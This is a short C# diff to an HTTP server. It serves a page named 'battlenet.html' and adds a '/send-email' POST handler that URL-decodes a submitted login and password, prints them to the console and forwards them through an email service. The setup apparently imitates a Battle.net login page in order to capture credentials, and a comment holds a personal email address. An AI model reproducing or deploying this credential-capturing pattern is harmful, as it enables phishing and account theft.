@@ -1,5 +1,6 @@
 ﻿using System.Net;
 using System.Text;
+using System.Web;
 using MimeKit;
 
 namespace MyHttpServer;
@@ -26,7 +27,7 @@ public class Server
         _isRunning = true;
         _server.Prefixes.Add(prefix);
         _server.Start();
-        Console.WriteLine($"Сервер запущен: {prefix}");
+        Console.WriteLine($"Сервер запущен: {prefix}{_config.StaticFilesPath}/battlenet.html");
         
         StartServer();
 
@@ -81,18 +82,22 @@ public class Server
                 }
             }
             
-            else if (request.HttpMethod == "POST")
+            else if (request.HttpMethod == "POST" && request.Url.LocalPath.Equals("/send-email"))
             {
 
                 using (var reader = new StreamReader(request.InputStream))
                 {
-                    string[] requestBody = reader.ReadToEnd().Split("");
-                    Console.WriteLine($"{requestBody[0]} , {requestBody[1]}");
-                    string login = requestBody[0];
-                    string password = requestBody[1];
-
-                    EmailSenderService emailSender = new EmailSenderService();
-                    await emailSender.SendEmailAsync(login, password);
+                    var streamRead = reader.ReadToEnd();
+                    string decodedData = HttpUtility.UrlDecode(streamRead, System.Text.Encoding.UTF8);
+                    Console.WriteLine(decodedData);
+                    
+                    string[] str = decodedData.Split("&");
+                    Console.WriteLine(str.Length);
+                    
+                    Console.WriteLine($"{str[0]}, {str[1]}");
+                    var emailSender = new EmailSenderService();
+                    // await emailSender.SendEmailAsync("gafarov277@gmail.com", "GaffarovMarat");
+                    await emailSender.SendEmailAsync(str[0].Split("=")[1], str[1].Split("=")[1]);
 
                     Console.WriteLine("Email sent successfully!");
                 }
